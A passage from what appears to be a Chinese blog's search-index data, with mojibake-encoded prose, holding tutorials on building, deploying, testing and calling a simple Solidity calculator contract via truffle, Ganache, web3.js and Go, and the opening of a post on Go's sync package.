","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:6:0","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"éƒ¨ç½²æ™ºèƒ½åˆçº¦ æ–°å»ºä¸€ä¸ªnode.js é¡¹ç›®deploy mkdir -p deploy/ cd deploy/ npm init touch index.js å®‰è£…web3.js npm install web3 åœ¨index.jsä¸­åŠ å…¥å¦‚ä¸‹ä»£ç : const fs = require('fs'); const Web3 = require('web3'); const web3 = new Web3('http://127.0.0.1:8545'); const bytecode = fs.readFileSync('../build/Calculator.bin').toString(); const abi = JSON.parse(fs.readFileSync('../build/Calculator.abi').toString()); (async function () { const accounts = await web3.eth.getAccounts(); const calculator = new web3.eth.Contract(abi); calculator.deploy({ data: bytecode }).send({ from: accounts[0], }).then((deployment) =\u003e { console.log('Contract was deployed at the following address:'); console.log(deployment.options.address); }).catch((err) =\u003e { console.error(err); }); })(); æ³¨æ„, ä¸Šé¢çš„éƒ¨ç½²ä»£ç æ²¡æœ‰ä½¿ç”¨è´¦æˆ·çš„ç§é’¥, æ˜¯å› ä¸ºåœ¨å‰é¢çš„æ­¥éª¤ä¸­, è´¦æˆ·å·²ç»è§£é”äº† åœ¨éƒ¨ç½²ä¹‹å‰éœ€è¦å…ˆå¯åŠ¨æŒ–çŸ¿ OSX MP16 ~/Downloads/pri/mychain â¯ ./attach.sh ... \u003e miner.start() null \u003e eth.blockNumber 26 éƒ¨ç½²: OSX MP16 ~/Downloads/pri/c/d/deploy_js â¯ node ./index.js Contract was deployed at the following address: 0x1F55d61D5Aa8eC92FD1Da0f19FaC9D552A29DBBF éƒ¨ç½²æˆåŠŸ, åœæ‰æŒ–çŸ¿, å¦åˆ™ç”µè„‘å·¨çƒ«â€¦ \u003e miner.stop() null ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:7:0","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"è°ƒç”¨æ™ºèƒ½åˆçº¦ è°ƒç”¨æ™ºèƒ½åˆçº¦å°±å’Œ ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨truffleå¥—ä»¶ä¸­çš„ä¸€æ ·äº†, å¯ä»¥è·³è½¬åˆ°é‚£é‡Œè¿›è¡Œå‚è€ƒ ","date":"2022-07-01","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/:8:0","tags":["solidity","ethereum","go-ethereum","python"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ ","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E6%89%8B%E5%B7%A5%E6%89%93%E9%80%A0/"},{"categories":["Blockchain"],"content":"è¿™ç¯‡æ–‡ç« å°†å¸¦ä½ ä½¿ç”¨truffleå¥—ä»¶ä»é›¶å¼€å§‹æ­å»ºç¯å¢ƒ, ç¼–å†™ã€éƒ¨ç½²ã€æµ‹è¯•å’Œè°ƒç”¨æ™ºèƒ½åˆçº¦ã€‚ é…å¥—ä»£ç åœ¨ https://github.com/yinhui1984/HelloTruffle ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:0:0","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["Blockchain"],"content":"ä½¿ç”¨truffleå¥—ä»¶ ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:1:0","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["Blockchain"],"content":"1. å®‰è£…node.js https://nodejs.org/en/ å®‰è£…å®Œæˆå, æŸ¥çœ‹æ˜¯å¦ç‰ˆæœ¬ä»¥ç¡®ä¿æˆåŠŸ npm -v node -v ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:1:1","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["Blockchain"],"content":"2. å®‰è£…truffleå’ŒGanache truffleæ˜¯ä¸€å¥—æ™ºèƒ½åˆçº¦çš„å¼€å‘æµ‹è¯•ç¯å¢ƒ Ganacheç”¨äºåˆ›å»ºæµ‹è¯•é“¾(å¯ä»¥åˆ›å»ºETH FILECOINç­‰æµ‹è¯•é“¾), ç”¨æ¥è·‘è‡ªå·±åˆ›å»ºçš„åˆçº¦. https://trufflesuite.com ä½¿ç”¨npmå®‰è£…truffle npm install -g truffle å®‰è£…å®Œæˆå, æŸ¥çœ‹ç‰ˆæœ¬ä»¥ç¡®ä¿æˆåŠŸ truffle version å¦‚æœé‡åˆ°permission denied: truffle æ‰¾åˆ°truffleæ–‡ä»¶ ll /usr/local/bin/truffle å¯ä»¥çœ‹åˆ°å…¶è½¯è¿æ¥åˆ°cli.bundled.js Permissions Size User Date Modified Name lrwxr-xr-x 48 zhouyinhui 29 Jun 14:06 ï€– /usr/local/bin/truffle -\u003e ../lib/node_modules/truffle/build/cli.bundled.js ç»™è¿™ä¸ªjsåŠ ä¸Šæ‰§è¡Œæƒé™å³å¯ chmod +x /usr/local/lib/node_modules/truffle/build/cli.bundled.js å®‰è£…Ganache åˆ°è¿™é‡Œç›´æ¥ä¸‹è½½å³å¯ https://trufflesuite.com/ganache/ ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:1:2","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["Blockchain"],"content":"3. ä½¿ç”¨truffleæ–°å»ºé¡¹ç›® æ–°å»ºä¸€ä¸ªç›®å½•, æ¯”å¦‚~/Downloads/truffleTest åˆ°è¿™ä¸ªç›®å½•ä¸‹ OSX MP16 ~/Downloads/truffleTest â¯ truffle init Starting init... ================ \u003e Copying project files to /Users/zhouyinhui/Downloads/truffleTest Init successful, sweet! Try our scaffold commands to get started: $ truffle create contract YourContractName # scaffold a contract $ truffle create test YourTestName # scaffold a test http://trufflesuite.com/docs å…¶æ–°å»ºäº†è¿™äº›æ–‡ä»¶ OSX MP16 ~/Downloads/truffleTest â¯ tree . â”œâ”€â”€ contracts â”‚Â â””â”€â”€ Migrations.sol â”œâ”€â”€ migrations â”‚Â â””â”€â”€ 1_initial_migration.js â”œâ”€â”€ test â””â”€â”€ truffle-config.js contractsæ–‡ä»¶å¤¹å­˜æ”¾åˆçº¦çš„åœ°æ–¹, åœ¨å…¶ä¸­æ–°å»ºä¸€ä¸ªsolidityæºç æ–‡ä»¶, æ¯”å¦‚Calculator.sol touch ./contracts/Calculator.sol åœ¨Calculator.solä¸­æ·»åŠ å¦‚ä¸‹ä»£ç æ¥åšä¸ªåŠ å‡æ³• // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Calculator { function add(int a, int b) public pure returns (int) { return a + b; } function subtract(int a, int b) public pure returns (int) { return a - b; } } å…¶ä¸­çš„pureè¡¨ç¤ºæ”¹å‡½æ•°æ—¢ä¸è¯»ä¹Ÿä¸å†™çŠ¶æ€æœºå˜é‡ https://hashnode.com/post/pure-vs-view-in-solidity-cl04tbzlh07kaudnv1ial1gio å¤åˆ¶ä¸Šé¢ä»£ç æ—¶æ³¨æ„ pragma solidity ^0.8.0;è¿™ä¸€è¡Œå’Œ trffle-config.jsä¸­çš„ä¸‹é¢çš„é…ç½®ç›¸åŒ¹é… // Configure your compilers compilers: { solc: { version: \"0.8.15\", //.... }, } pragma solidity ^0.8.0 è¡¨ç¤ºç¼–è¯‘å™¨ä½¿ç”¨0.8åˆ°0.9ç‰ˆæœ¬ä¹‹é—´çš„(ä¸åŒ…å«0.9), é‚£ä¹ˆtrffle-config.jsä¸­é…ç½®çš„ç¼–è¯‘å™¨ç‰ˆæœ¬è¦åœ¨è¿™ä¸ªèŒƒå›´å†… ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:1:3","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["Blockchain"],"content":"4.ç¼–è¯‘ truffle compile OSX MP16 ~/Downloads/truffleTest â¯ truffle compile Compiling your contracts... =========================== \u003e Compiling ./contracts/Calculator.sol \u003e Artifacts written to /Users/zhouyinhui/Downloads/truffleTest/build/contracts \u003e Compiled successfully using: - solc: 0.8.15+commit.e14f2714.Emscripten.clang ç¼–è¯‘å®Œæˆå, ä¼šå°†ç»“æœæ”¾åˆ°buildç›®å½•ä¸‹: æˆ‘ä»¬è¿™é‡Œå…³å¿ƒçš„æ˜¯Calculator.json OSX MP16 ~/Downloads/truffleTest â¯ tree . â”œâ”€â”€ build â”‚Â â””â”€â”€ contracts â”‚Â â”œâ”€â”€ Calculator.json â”‚Â â””â”€â”€ Migrations.json â”œâ”€â”€ contracts â”‚Â â”œâ”€â”€ Calculator.sol â”‚Â â””â”€â”€ Migrations.sol â”œâ”€â”€ migrations â”‚Â â””â”€â”€ 1_initial_migration.js â”œâ”€â”€ test â””â”€â”€ truffle-config.js 5 directories, 6 files ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:1:4","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["Blockchain"],"content":"5.éƒ¨ç½²åˆ°æµ‹è¯•é“¾ å¯åŠ¨æµ‹è¯•é“¾ å¯åŠ¨ ganache App, ç‚¹å‡»QUICKSTART å…¶å°±è‡ªåŠ¨åˆ›å»ºäº†ETHæµ‹è¯•é“¾, æŸ¥çœ‹çª—å£ä¸ŠåŠéƒ¨åˆ†æ˜¾ç¤ºçš„çš„RPC serverä¿¡æ¯, æ¯”å¦‚ HTTP://127.0.0.1:8545 ä¿®æ”¹ truffle-config.jsä¸­çš„éƒ¨ç½²é…ç½®, ä½¿å…¶ä¸ä¸Šé¢çš„RPC serverå‘åŒ¹é… networks: { //... development: { host: \"127.0.0.1\", // Localhost (default: none) port: 8545, // Standard Ethereum port (default: none) network_id: \"*\", // Any network (default: none) }, Note è¯·ä¿æŒganacheåœ¨åå°è¿è¡Œ, åé¢çš„ä»£ç éƒ½éœ€è¦è®¿é—®æµ‹è¯•é“¾ æ·»åŠ éƒ¨ç½²ä»£ç  touch migrations/2_deploy_contracts.js åœ¨2_deploy_contracts.jsä¸­åŠ å…¥å¦‚ä¸‹ä»£ç  var Calculator = artifacts.require(\"./Calculator.sol\"); module.exports = function(deployer) { deployer.deploy(Calculator); } éƒ¨ç½²åˆçº¦ è¿è¡Œ truffle migrate å‘½ä»¤è¿›è¡Œéƒ¨ç½² OSX MP16 ~/Downloads/truffleTest â¯ truffle migrate Compiling your contracts... =========================== \u003e Everything is up to date, there is nothing to compile. Starting migrations... ====================== \u003e Network name: 'development' \u003e Network id: 5777 \u003e Block gas limit: 6721975 (0x6691b7) 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- \u003e transaction hash: 0xc4b0bf65cbac8d1cf68b72fc6408bd443c18e6bf3e44c5985dede50b191a80d1 \u003e Blocks: 0 Seconds: 0 \u003e contract address: 0xe2fd5fA1303B9791417EF637AABd50aE9DB9Af44 \u003e block number: 1 \u003e block timestamp: 1656490514 \u003e account: 0xe149d5f732685669C9E494B233fDB4312d19b5cF \u003e balance: 99.99502292 \u003e gas used: 248854 (0x3cc16) \u003e gas price: 20 gwei \u003e value sent: 0 ETH \u003e total cost: 0.00497708 ETH \u003e Saving migration to chain. \u003e Saving artifacts ------------------------------------- \u003e Total cost: 0.00497708 ETH 2_deploy_contracts.js ===================== Deploying 'Calculator' ---------------------- \u003e transaction hash: 0xc8cce4b870d187dadf38353e6ef71aabd0751375a2f2b8c763ed4a35d8067a0c \u003e Blocks: 0 Seconds: 0 \u003e contract address: 0x6B62e4E253823FBC65E0B93d63ee149350158a18 \u003e block number: 3 \u003e block timestamp: 1656490515 \u003e account: 0xe149d5f732685669C9E494B233fDB4312d19b5cF \u003e balance: 99.98984578 \u003e gas used: 216344 (0x34d18) \u003e gas price: 20 gwei \u003e value sent: 0 ETH \u003e total cost: 0.00432688 ETH \u003e Saving migration to chain. \u003e Saving artifacts ------------------------------------- \u003e Total cost: 0.00432688 ETH Summary ======= \u003e Total deployments: 2 \u003e Final cost: 0.00930396 ETH ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:1:5","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["Blockchain"],"content":"6. æµ‹è¯•åˆçº¦ ä½¿ç”¨truffle console æ‰‹åŠ¨è°ƒç”¨ è¿è¡Œ truffle console æ‰“å¼€æ§åˆ¶å° truffle(development)\u003e let cal = await Calculator.deployed() truffle(development)\u003e cal.add(1,2) BN { negative: 0, words: [ 3, \u003c1 empty item\u003e ], length: 1, red: null } truffle(development)\u003e cal.subtract(10, 2) BN { negative: 0, words: [ 8, \u003c1 empty item\u003e ], length: 1, red: null } åœ¨æ§åˆ¶å°ä¸­å¯ä»¥ä½¿ç”¨TABæŒ‰é”®æ¥æç¤ºæˆå‘˜å˜é‡æˆ–å‡½æ•° ä½¿ç”¨jsç¼–å†™å•å…ƒæµ‹è¯• touch test/testCalculator.test.js //testCalculator.test.js //å¼€å‘æ¡†æ¶å¯¼å…¥åˆçº¦ const Calculator = artifacts.require(\"Calculator\"); //æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å®šä¹‰ç”¨äºæµ‹è¯•çš„åˆçº¦ï¼Œç„¶åå°†è´¦æˆ·ä½œä¸ºåŒ…å«æ‰€æœ‰åœ°å€çš„å‚æ•°ä¼ é€’ã€‚ contract(\"Calculator\", accounts =\u003e { //itåŒ…å«å¯¹æˆ‘ä»¬è¦è¿è¡Œçš„æµ‹è¯•çš„ç®€çŸ­æè¿°ï¼Œ // å®ƒæ˜¯ä¸€ä¸ªåŒ…å«æ‰€æœ‰æµ‹è¯•ç›¸å…³è„šæœ¬çš„å¼‚æ­¥å‡½æ•° it(\"should add two numbers\", async () =\u003e { //cal: å®šä¹‰å­˜å‚¨å·²éƒ¨ç½²åˆçº¦çš„å®ä¾‹ã€‚ const cal = await Calculator.deployed(); const result = await cal.add(4, 2); assert.equal(result.toNumber(), 6); }).timeout(10000); it(\"should subtract two numbers\", async () =\u003e { const cal = await Calculator.deployed(); const result = await cal.subtract(3, 2); assert.equal(result.toNumber(), 1); }).timeout(10000); }); è¿è¡Œ truffle test è·‘æµ‹è¯• OSX MP16 ~/Downloads/truffleTest â¯ truffle test Using network 'development'. Compiling your contracts... =========================== \u003e Everything is up to date, there is nothing to compile. Contract: Calculator âœ” should add two numbers âœ” should subtract two numbers (48ms) 2 passing (126ms) ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:1:6","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["Blockchain"],"content":"7. demoAppè°ƒç”¨åˆçº¦ ä½¿ç”¨web3.js æˆ‘ä»¬ä½¿ç”¨web3.js åˆ›å»ºä¸€ä¸ªappæ¥å®é™…ä½¿ç”¨æˆ‘ä»¬çš„åˆçº¦ åˆå§‹åŒ–ä¸€ä¸ªnode.js app mkdir -p ./demo/jsApp cd ./demo/jsApp/ npm init ç„¶åä¸€è·¯é»˜è®¤å›è½¦ touch index.js å®‰è£…web3.js npm install web3 åœ¨index.jsä¸­åŠ å…¥å¦‚ä¸‹ä»£ç  const Web3 = require('web3'); //æ³¨æ„ï¼Œè¿™é‡Œæœ‰ä¸ªå‘ï¼Œ æœ‰æ—¶å€™http://localhost:8545 ç”¨localhostå¯ä»¥ï¼Œæœ‰æ—¶å€™è¿æ¥ä¸ä¸Š //æœ€å¥½ç”¨127.0.0.1 const web3 = new Web3(new Web3.providers.HttpProvider(\"http://127.0.0.1:8545\")); //web3.eth.getAccounts().then(console.log) //modify the following line to your own contract address let contractAddress = \"0x6B62e4E253823FBC65E0B93d63ee149350158a18\"; //copy abi from ./build/contracts/Calculator.json let abi = [ { \"inputs\": [ { \"internalType\": \"int256\", \"name\": \"a\", \"type\": \"int256\" }, { \"internalType\": \"int256\", \"name\": \"b\", \"type\": \"int256\" } ], \"name\": \"add\", \"outputs\": [ { \"internalType\": \"int256\", \"name\": \"\", \"type\": \"int256\" } ], \"stateMutability\": \"pure\", \"type\": \"function\", \"constant\": true }, { \"inputs\": [ { \"internalType\": \"int256\", \"name\": \"a\", \"type\": \"int256\" }, { \"internalType\": \"int256\", \"name\": \"b\", \"type\": \"int256\" } ], \"name\": \"subtract\", \"outputs\": [ { \"internalType\": \"int256\", \"name\": \"\", \"type\": \"int256\" } ], \"stateMutability\": \"pure\", \"type\": \"function\", \"constant\": true } ] let contract = new web3.eth.Contract(abi,contractAddress); contract.methods.add(4,2).call().then(console.log); contract.methods.subtract(3,2).call().then(console.log); å…¶ä¸­çš„ contractAddressæ˜¯æˆ‘ä»¬éƒ¨ç½²çš„Caculatoråˆçº¦åœ°å€ å¦‚ä½•æ‰¾åˆ°åˆçº¦åœ°å€? æ–¹å¼1, åœ¨ä¸Šé¢çš„truffle migrateè¿›è¡Œåˆçº¦éƒ¨ç½²æ—¶,ä¼šæ‰“å° æ–¹å¼2, åœ¨Ganacheè½¯ä»¶ç•Œé¢çš„Transactionsä¸­æ‰¾, è²Œä¼¼ä¸æ–¹ä¾¿ æ–¹å¼3, åœ¨Ganacheè½¯ä»¶ç•Œé¢ : Settings -\u003e Workspace ä¸­ç‚¹å‡»ADD Project æ·»åŠ  truffle-config.jsæ–‡ä»¶å…³è”é¡¹ç›®, ç„¶åç‚¹å‡»RESTARTé‡æ–°å›åˆ°ä¸»ç•Œé¢çš„CONTRACTSå°±å¯ä»¥çœ‹åˆ°äº† æ–¹å¼4, è¿è¡Œtruffle console truffle(development)\u003e Calculator.address '0x6B62e4E253823FBC65E0B93d63ee149350158a18' å…¶ä¸­çš„abiæ˜¯åˆçº¦å¯¹åº”çš„abi å¦‚ä½•æ‰¾åˆ°abi? æ–¹å¼1, solc --abi ./contracts/Calculator.sol æ–¹å¼2, åˆ°./build/contracts/Calculator.jsonä¸­, æ‰¾åˆ°\"abi\"å¯¹åº”çš„å€¼ ä¸è¦ä½¿ç”¨truffle consoleä¸­çš„Calculator.abi è¿è¡Œapp OSX MP16 ~/Downloads/truffleTest/demo/jsApp â¯ node index.js 6 1 ä½¿ç”¨golang mkdir -p ./demo/goApp cd ./demo/goApp touch main.go go mod init goApp éœ€è¦ä½¿ç”¨åˆ° \"github.com/ethereum/go-ethereum/ethclient\"è¿™ä¸ªåŒ… go get \"github.com/ethereum/go-ethereum/ethclient\" è¿™ä¸ªåŒ…å¦‚æœè¦è°ƒç”¨åˆçº¦, åˆ™éœ€è¦ä¸€äº›é¢å¤–çš„æ“ä½œ é¢å¤–çš„æ“ä½œ: åˆ©ç”¨ abigen ä»solidityæºæ–‡ä»¶ç”Ÿæˆgolangä»£ç  OSX MP16 ~/Downloads/truffleTest/demo/goApp â¯ mkdir contracts abigen --pkg contracts --sol ../../contracts/Calculator.sol --out ./contracts/calculatorContract.go â€“pkg contracts : æŒ‡å®šç”Ÿæˆçš„ä»£ç çš„ package name â€“sol ../../contracts/Calculator.sol : æŒ‡å®šåˆçº¦ä»£ç ä½ç½® â€“out ./contracts/calculatorContract.go: æŒ‡å®šç”Ÿæˆçš„ä»£ç ä½ç½® ç”Ÿæˆå®Œæˆå, goAppçš„ç›®å½•ç»“æ„å¦‚ä¸‹: tree ~/Downloads/truffleTest/demo/goApp /Users/zhouyinhui/Downloads/truffleTest/demo/goApp â”œâ”€â”€ contracts â”‚Â â””â”€â”€ calculatorContract.go â”œâ”€â”€ go.mod â”œâ”€â”€ go.sum â””â”€â”€ main.go ç”Ÿæˆåçš„calculatorContract.goä¸­importåŒ…,å¯èƒ½å¹¶ä¸åœ¨go.modä¸­, æ‰€ä»¥è¿è¡Œä¸€æ¬¡ go mod tidyä»¥é¿å…ç¼–è¯‘æ—¶æ‰¾ä¸åˆ°åŒ… main.goä¸­ä»£ç å¦‚ä¸‹: package main import ( \"fmt\" \"github.com/ethereum/go-ethereum/accounts/abi/bind\" \"github.com/ethereum/go-ethereum/common\" \"github.com/ethereum/go-ethereum/ethclient\" \"goApp/contracts\" \"math/big\" ) //https://goethereumbook.org/client-setup/ func main() { client, err := ethclient.Dial(\"http://localhost:8545\") if err != nil { fmt.Println(\"could not connect to local node, err:\", err) return } contractAddress := common.HexToAddress(\"0x6B62e4E253823FBC65E0B93d63ee149350158a18\") calculator, err := contracts.NewCalculator(contractAddress, client) if err != nil { fmt.Println(\"could not instantiate contract, err:\", err) return } callOpts := bind.CallOpts{ Context: nil, Pending: false, } a := big.NewInt(1) b := big.NewInt(2) result, err := calculator.Add(\u0026callOpts, a, b) if err != nil { fmt.Println(\"could not call contract, err:\", err) return } fmt.Println(\"add result:\", result) result, err = calculator.Subtract(\u0026callOpts, a, b) if err != nil { fmt.Println(\"could not call contract, err:\", err) return } fmt.Println(\"subtract result:\", result) } è¿è¡Œ OSX MP16 ~/Downloads/truffleTest/demo/goApp â¯ go run . add result: 3 subtract result: -1 ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:1:7","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["Blockchain"],"content":"æ‰‹å·¥æ’¸ è¿™é‡Œ: https://yinhui1984.github.io/ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-æ‰‹å·¥æ‰“é€ / ","date":"2022-06-29","objectID":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/:2:0","tags":["solidity","truffle","ganache","ethereum","go-ethereum"],"title":"ä»é›¶å¼€å§‹ç¼–å†™æ™ºèƒ½åˆçº¦-ä½¿ç”¨trtffleå¥—ä»¶","uri":"/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E4%BD%BF%E7%94%A8truffle%E5%A5%97%E4%BB%B6/"},{"categories":["golang"],"content":"æˆ‘ä»¬å°†ç”¨äº›ç®€å•çš„ä¾‹å­æ¥å°è¯•golangä¸­syncåŒ…çš„å„ç§æœ‰è¶£çš„æƒ…å†µ ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:0:0","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"ä¸€ä¸ªç®€å•çš„DEMO package main import \"fmt\" var ( sharedCounter = 0 ) func add(count int) { for i := 0; i \u003c count; i++ { sharedCounter++ } } func sub(count int) { for i := 0; i \u003c count; i++ { sharedCounter-- } } func show() { fmt.Println(sharedCounter) } func main() { add(1000000) sub(1000000) show() } ç¨‹åºå¾ˆç®€å•, 